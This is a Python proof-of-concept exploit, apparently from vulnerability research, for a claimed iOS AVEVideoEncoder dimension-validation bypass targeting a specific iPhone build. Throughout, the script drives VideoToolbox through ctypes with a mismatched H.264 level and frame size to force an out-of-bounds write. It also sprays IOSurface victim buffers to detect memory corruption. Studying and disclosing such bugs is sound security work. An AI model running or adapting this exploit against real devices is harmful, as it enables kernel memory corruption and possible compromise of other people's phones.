#!/usr/bin/env python3
"""
CVE-2026-112689 PoC — AVEVideoEncoder frame dimension validation bypass
Target: iOS 26.6.1 (iPhone17,4, build 23G83)

Bug: AVE_AVC_CheckInfo (0x851c454) validates iNumViews/iLayerNum but does NOT call
     the frame dimension validator (0x852f9d4) for standard AVC sessions.
     In 26.7.2 this call was added (sub_fffffff00853aa34).

Attack: Set codec level = Baseline 1.0 (max 99 MBs = 176×144 capacity)
        with frame = 1920×1080 (8160 MBs actual).
        AVE2 allocates buffer sized for 99 MBs, write loop uses 8160 MBs → OOB.

Run via ResearchHost offload_python. Close PocketCode first (memory constraint).
"""

import ctypes, ctypes.util, struct, time

# ── Frameworks ──────────────────────────────────────────────────────────────
CF  = ctypes.CDLL('/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation')
VT  = ctypes.CDLL('/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox')
CV  = ctypes.CDLL('/System/Library/Frameworks/CoreVideo.framework/CoreVideo')
CM  = ctypes.CDLL('/System/Library/Frameworks/CoreMedia.framework/CoreMedia')

# ── CF helpers ───────────────────────────────────────────────────────────────
CF.CFStringCreateWithCString.restype  = ctypes.c_void_p
CF.CFStringCreateWithCString.argtypes = [ctypes.c_void_p, ctypes.c_char_p, ctypes.c_uint32]
CF.CFNumberCreate.restype  = ctypes.c_void_p
CF.CFNumberCreate.argtypes = [ctypes.c_void_p, ctypes.c_long, ctypes.c_void_p]
CF.CFDictionaryCreate.restype  = ctypes.c_void_p
CF.CFDictionaryCreate.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
                                   ctypes.c_long, ctypes.c_void_p, ctypes.c_void_p]
CF.CFDictionaryGetValue.restype  = ctypes.c_void_p
CF.CFDictionaryGetValue.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
CF.CFRelease.argtypes = [ctypes.c_void_p]
CF.CFRetain.restype  = ctypes.c_void_p
CF.CFRetain.argtypes = [ctypes.c_void_p]
CF.CFShow.argtypes   = [ctypes.c_void_p]
CF.CFBooleanGetValue.restype  = ctypes.c_bool
CF.CFBooleanGetValue.argtypes = [ctypes.c_void_p]

kCFStringEncodingUTF8 = 0x8000100

def cfstr(s):
    return CF.CFStringCreateWithCString(None, s.encode(), kCFStringEncodingUTF8)

def cfnum_int(n):
    v = ctypes.c_int64(n)
    return CF.CFNumberCreate(None, 4, ctypes.byref(v))  # kCFNumberSInt64Type=4

def cfdict(pairs):
    n = len(pairs)
    keys_arr = (ctypes.c_void_p * n)(*[k for k,_ in pairs])
    vals_arr = (ctypes.c_void_p * n)(*[v for _,v in pairs])
    kcb = ctypes.addressof(ctypes.c_char.in_dll(CF, 'kCFTypeDictionaryKeyCallBacks'))
    vcb = ctypes.addressof(ctypes.c_char.in_dll(CF, 'kCFTypeDictionaryValueCallBacks'))
    return CF.CFDictionaryCreate(None, keys_arr, vals_arr, n, kcb, vcb)

# ── CVPixelBuffer ────────────────────────────────────────────────────────────
CV.CVPixelBufferCreate.restype  = ctypes.c_int32
CV.CVPixelBufferCreate.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_size_t,
                                    ctypes.c_uint32, ctypes.c_void_p,
                                    ctypes.POINTER(ctypes.c_void_p)]
CV.CVPixelBufferRelease.argtypes = [ctypes.c_void_p]

kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange = 0x34323076  # '420v'

def make_pixel_buffer(width, height):
    pb = ctypes.c_void_p(0)
    # Empty attributes dict
    kcb = ctypes.addressof(ctypes.c_char.in_dll(CF, 'kCFTypeDictionaryKeyCallBacks'))
    vcb = ctypes.addressof(ctypes.c_char.in_dll(CF, 'kCFTypeDictionaryValueCallBacks'))
    attrs = CF.CFDictionaryCreate(None, None, None, 0, kcb, vcb)
    kr = CV.CVPixelBufferCreate(None, width, height,
                                 kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                 attrs, ctypes.byref(pb))
    CF.CFRelease(attrs)
    return kr, pb.value

# ── CMTime ───────────────────────────────────────────────────────────────────
# CMTime is a struct: { int64 value, int32 timescale, uint32 flags, int64 epoch }
class CMTime(ctypes.Structure):
    _fields_ = [('value', ctypes.c_int64),
                ('timescale', ctypes.c_int32),
                ('flags', ctypes.c_uint32),
                ('epoch', ctypes.c_int64)]

kCMTimeFlags_Valid = 1

def make_cmtime(value, timescale=1):
    t = CMTime()
    t.value = value
    t.timescale = timescale
    t.flags = kCMTimeFlags_Valid
    t.epoch = 0
    return t

# ── VTCompressionSession ─────────────────────────────────────────────────────
VT.VTCompressionSessionCreate.restype  = ctypes.c_int32
# signature: (allocator, width, height, codecType, encoderSpec, imageBufferAttrs, compressedDataAllocator, outputCallback, outputCallbackRefCon, compressionSessionOut)
VT.VTCompressionSessionCreate.argtypes = [
    ctypes.c_void_p,  # allocator (NULL = default)
    ctypes.c_int32,   # width
    ctypes.c_int32,   # height
    ctypes.c_uint32,  # codecType (kCMVideoCodecType_H264 = 0x61766331)
    ctypes.c_void_p,  # encoderSpecification (NULL)
    ctypes.c_void_p,  # imageBufferAttributes (NULL)
    ctypes.c_void_p,  # compressedDataAllocator (NULL)
    ctypes.c_void_p,  # outputCallback (NULL for sync)
    ctypes.c_void_p,  # outputCallbackRefCon (NULL)
    ctypes.POINTER(ctypes.c_void_p),  # compressionSessionOut
]

VT.VTSessionSetProperty.restype  = ctypes.c_int32
VT.VTSessionSetProperty.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p]

VT.VTCompressionSessionEncodeFrame.restype  = ctypes.c_int32
# (session, imageBuffer, presentationTimeStamp, duration, frameProperties, sourceFrameRefcon, infoFlagsOut)
VT.VTCompressionSessionEncodeFrame.argtypes = [
    ctypes.c_void_p,  # session
    ctypes.c_void_p,  # imageBuffer (CVPixelBufferRef)
    CMTime,           # presentationTimeStamp
    CMTime,           # duration
    ctypes.c_void_p,  # frameProperties (NULL)
    ctypes.c_void_p,  # sourceFrameRefcon (NULL)
    ctypes.POINTER(ctypes.c_uint32),  # infoFlagsOut (NULL ok)
]

VT.VTCompressionSessionCompleteFrames.restype  = ctypes.c_int32
VT.VTCompressionSessionCompleteFrames.argtypes = [ctypes.c_void_p, CMTime]

# ── VT property keys (CFString globals in VideoToolbox) ──────────────────────
def vt_key(name):
    # Look up CFStringRef from VideoToolbox by symbol name
    try:
        return ctypes.c_void_p.in_dll(VT, name).value
    except Exception:
        return cfstr(name.replace('kVTCompressionPropertyKey_', '')
                        .replace('kVTProfileLevel_', ''))

kCMVideoCodecType_H264 = 0x61766331  # 'avc1'

# Profile level strings (the actual CFString values)
# kVTProfileLevel_H264_Baseline_1_0 = CFSTR("H264_Baseline_1_0")
PROFILE_LEVELS = [
    ("H264_Baseline_1_0",  "Baseline 1.0 — max  99 MBs (176×144)"),
    ("H264_Baseline_3_0",  "Baseline 3.0 — max 1620 MBs (1280×720 ~ok)"),
    ("H264_Main_3_1",      "Main 3.1     — max 3600 MBs"),
    ("H264_High_4_0",      "High 4.0     — max 24576 MBs"),
    ("H264_High_4_1",      "High 4.1     — max 24576 MBs"),
    ("H264_High_Auto",     "High Auto    — level picked by encoder"),
]

# ── Spray / victim buffers for OOB detection ─────────────────────────────────
CV.CVPixelBufferGetBaseAddressOfPlane.restype  = ctypes.c_void_p
CV.CVPixelBufferGetBaseAddressOfPlane.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
CV.CVPixelBufferLockBaseAddress.restype  = ctypes.c_int32
CV.CVPixelBufferLockBaseAddress.argtypes = [ctypes.c_void_p, ctypes.c_uint64]
CV.CVPixelBufferUnlockBaseAddress.restype  = ctypes.c_int32
CV.CVPixelBufferUnlockBaseAddress.argtypes = [ctypes.c_void_p, ctypes.c_uint64]
CV.CVPixelBufferGetDataSize.restype  = ctypes.c_size_t
CV.CVPixelBufferGetDataSize.argtypes = [ctypes.c_void_p]

# ── IOSurface (victim allocation) ────────────────────────────────────────────
IOS = ctypes.CDLL('/System/Library/Frameworks/IOSurface.framework/IOSurface')
IOS.IOSurfaceCreate.restype  = ctypes.c_void_p
IOS.IOSurfaceCreate.argtypes = [ctypes.c_void_p]
IOS.IOSurfaceGetBaseAddress.restype  = ctypes.c_void_p
IOS.IOSurfaceGetBaseAddress.argtypes = [ctypes.c_void_p]
IOS.IOSurfaceGetAllocSize.restype  = ctypes.c_size_t
IOS.IOSurfaceGetAllocSize.argtypes = [ctypes.c_void_p]

def make_iosurface(alloc_size):
    kStr = CF.CFStringCreateWithCString(None, b'IOSurfaceAllocSize', kCFStringEncodingUTF8)
    n = ctypes.c_int64(alloc_size)
    vNum = CF.CFNumberCreate(None, 4, ctypes.byref(n))
    kcb = ctypes.addressof(ctypes.c_char.in_dll(CF, 'kCFTypeDictionaryKeyCallBacks'))
    vcb = ctypes.addressof(ctypes.c_char.in_dll(CF, 'kCFTypeDictionaryValueCallBacks'))
    keys = (ctypes.c_void_p * 1)(kStr)
    vals = (ctypes.c_void_p * 1)(vNum)
    d = CF.CFDictionaryCreate(None, keys, vals, 1, kcb, vcb)
    surf = IOS.IOSurfaceCreate(d)
    CF.CFRelease(d); CF.CFRelease(kStr); CF.CFRelease(vNum)
    return surf

# ── Main PoC ─────────────────────────────────────────────────────────────────
def run_poc(width, height, profile_str, profile_desc, num_frames=3, check_victims=True):
    print(f"\n{'='*60}")
    print(f"Testing: {profile_desc}")
    print(f"Frame: {width}×{height} = {(width//16)*(height//16)} MBs")

    # Spray victim IOSurfaces at likely allocation size for the given level
    # Level 1.0 CalcBufSizeOf(LFSResult, etc.) should produce small allocations
    # We fill victims with 0xAA to detect OOB write
    VICTIM_SIZE = 0x20000  # 128 KB — typical small allocation
    VICTIM_COUNT = 8

    victims = []
    if check_victims:
        for _ in range(VICTIM_COUNT):
            s = make_iosurface(VICTIM_SIZE)
            if s:
                va = IOS.IOSurfaceGetBaseAddress(s)
                if va:
                    ctypes.memset(va, 0xAA, VICTIM_SIZE)
                victims.append((s, va))
        print(f"Sprayed {len(victims)} victim IOSurfaces @ 0x{VICTIM_SIZE:x} bytes, pre-filled 0xAA")

    # Create pixel buffer
    kr, pb = make_pixel_buffer(width, height)
    if kr != 0 or not pb:
        print(f"CVPixelBufferCreate FAILED: kr=0x{kr:x}")
        return False
    print(f"PixelBuffer created: 0x{pb:x}")

    # Create compression session
    session = ctypes.c_void_p(0)
    kr = VT.VTCompressionSessionCreate(
        None, width, height, kCMVideoCodecType_H264,
        None, None, None, None, None,
        ctypes.byref(session)
    )
    print(f"VTCompressionSessionCreate: kr=0x{kr:x} session=0x{session.value or 0:x}")
    if kr != 0 or not session.value:
        print("  FAILED — VT rejected session creation")
        CV.CVPixelBufferRelease(pb)
        return False

    # Set profile/level
    profile_cfstr = cfstr(profile_str)
    try:
        key_sym = ctypes.c_void_p.in_dll(VT, 'kVTCompressionPropertyKey_ProfileLevel')
        key_ptr = key_sym.value
    except Exception:
        key_ptr = cfstr('ProfileLevel')

    kr_level = VT.VTSessionSetProperty(session.value, key_ptr, profile_cfstr)
    print(f"SetProperty ProfileLevel={profile_str}: kr=0x{kr_level:x}")
    CF.CFRelease(profile_cfstr)

    if kr_level != 0:
        print(f"  → Rejected at property level (expected in patched builds)")
        # Still try encoding — maybe the rejection is soft

    # Allow frame reordering off for simpler encode
    try:
        key_reorder = ctypes.c_void_p.in_dll(VT, 'kVTCompressionPropertyKey_AllowFrameReordering').value
        false_val = ctypes.c_void_p.in_dll(CF, 'kCFBooleanFalse').value
        VT.VTSessionSetProperty(session.value, key_reorder, false_val)
    except Exception:
        pass

    # Encode frames
    flags_out = ctypes.c_uint32(0)
    success_count = 0
    for i in range(num_frames):
        pts = make_cmtime(i * 1000, 30000)  # i/30 seconds
        dur = make_cmtime(1000, 30000)
        kr_enc = VT.VTCompressionSessionEncodeFrame(
            session.value, pb, pts, dur, None, None, ctypes.byref(flags_out)
        )
        print(f"  EncodeFrame[{i}]: kr=0x{kr_enc:x} flags=0x{flags_out.value:x}")
        if kr_enc != 0:
            print(f"  → Encode FAILED: 0x{kr_enc:x}")
            break
        success_count += 1
        time.sleep(0.1)

    if success_count > 0:
        # Complete frames
        kinda_forever = make_cmtime(0x7FFFFFFFFFFFFFFF, 1)
        kr_complete = VT.VTCompressionSessionCompleteFrames(session.value, kinda_forever)
        print(f"CompleteFrames: kr=0x{kr_complete:x}")
        time.sleep(0.5)

    # Check victims for corruption
    if check_victims:
        corrupted = 0
        for s, va in victims:
            if not va: continue
            # Read first 256 bytes and check for non-0xAA values
            buf = (ctypes.c_uint8 * 256).from_address(va)
            non_aa = [(i, buf[i]) for i in range(256) if buf[i] != 0xAA]
            if non_aa:
                corrupted += 1
                print(f"  *** CORRUPTION DETECTED in victim surface! "
                      f"First diff: offset={non_aa[0][0]} val=0x{non_aa[0][1]:02x}")
        if corrupted == 0:
            print(f"  Victims: all 0xAA (no detectable corruption — may need heap shaping)")
        else:
            print(f"  *** {corrupted}/{len(victims)} victims corrupted — OOB WRITE CONFIRMED ***")

    # Release (avoid VTCompressionSessionInvalidate — it can hang)
    CF.CFRelease(session.value)
    CV.CVPixelBufferRelease(pb)
    for s, _ in victims:
        if s: CF.CFRelease(s)

    return success_count > 0


def main():
    print("CVE-2026-112689 PoC — AVEVideoEncoder dimension bypass")
    print("Target: iOS 26.6.1 (23G83) iPhone17,4")
    print()

    # Stage 1: Probe which level/dimension combos succeed
    # Start conservative, then escalate
    test_cases = [
        # (width, height, profile_str, description)
        (1920, 1080, "H264_Baseline_3_0", "1080p + Baseline 3.0 (control — should work)"),
        (1920, 1080, "H264_Baseline_1_0", "1080p + Baseline 1.0 (max 99 MBs — EXPLOIT TARGET)"),
        (3840, 2160, "H264_Baseline_1_0", "4K + Baseline 1.0 (max 99 MBs — max OOB)"),
        (1920, 1080, "H264_Main_3_0",     "1080p + Main 3.0"),
    ]

    for width, height, profile, desc in test_cases:
        try:
            result = run_poc(width, height, profile, desc, num_frames=3, check_victims=True)
            print(f"→ Encode succeeded: {result}")
        except Exception as e:
            print(f"→ Exception: {e}")
        time.sleep(1)

    print("\nDone.")

main()
